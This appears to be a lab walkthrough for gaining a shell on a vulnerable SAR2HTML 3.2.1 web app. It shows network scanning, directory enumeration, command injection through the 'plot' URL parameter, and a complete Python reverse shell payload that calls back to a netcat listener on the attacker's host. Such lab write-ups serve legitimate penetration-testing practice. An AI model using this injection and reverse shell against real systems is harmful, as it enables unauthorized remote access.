## 📌 Objective

Gain remote shell access to a vulnerable SAR2HTML web app and document the attack steps using enumeration, exploitation, and reverse shell techniques.

---

## 🔍 Step 1: Network Discovery

### 🔹 Discover Target IP

```bash
netdiscover -r 10.0.2.0/24

```

- Found target machine at: `10.0.2.6`

---

## 🔎 Step 2: Port Scanning

### 🔹 Run Nmap for Open Ports & Service Detection

```bash
nmap -A 10.0.2.6

```

- Found **port 80 (HTTP)** open.

---

## 🌐 Step 3: Web Enumeration

### 🔹 Use Gobuster to Find Hidden Directories

```bash
gobuster dir -u http://10.0.2.6 -w /usr/share/wordlists/dirb/common.txt

```

- Found: `/robots.txt`

### 🔹 Check robots.txt

```
http://10.0.2.6/robots.txt

```

- Discovered link to: `/sar2HTML/`

---

## 📁 Step 4: SAR2HTML Enumeration

### Access:

```
http://10.0.2.6/sar2HTML/

```

### Observations:

- SAR2HTML version **3.2.1**
- Web interface to upload SAR system reports
- Known to be vulnerable to **RCE via `plot` parameter**

---

## 🧪 Step 5: Confirm Remote Code Execution

### Test with Basic Command Injection:

```
http://10.0.2.6/sar2HTML/index.php?plot=;whoami

```

### ✅ Result:

- Returns `www-data` or similar → confirms RCE is working.

---

## 🛠️ Step 6: Gain Reverse Shell Access

### Start Netcat Listener on Attacker (Kali) Machine:

```bash
nc -lvnp 4444

```

### Use Python Reverse Shell Payload:

```
http://10.0.2.6/sar2HTML/index.php?plot=;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.2.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

> Replace 10.0.2.5 with your Kali IP.
> 

### ✅ If successful:

- Netcat listener shows:
    
    ```
    Connection received on 10.0.2.6
    
    ```
    
- You get a working remote shell.

---

## 💡 Summary of Exploitation Commands

| URL | Purpose |
| --- | --- |
| `http://10.0.2.6/sar2HTML/index.php?plot=;whoami` | Confirms RCE is possible |
| `http://10.0.2.6/sar2HTML/index.php?plot=;python3 -c '...'` | Opens a reverse shell to attacker's listener |

---

## 🧠 Key Concepts Used

- **RCE (Remote Code Execution)** via URL parameter injection
- **Reverse Shell** using Python
- **Netcat listener** for catching the shell
- **Enumeration** with Gobuster and Nmap
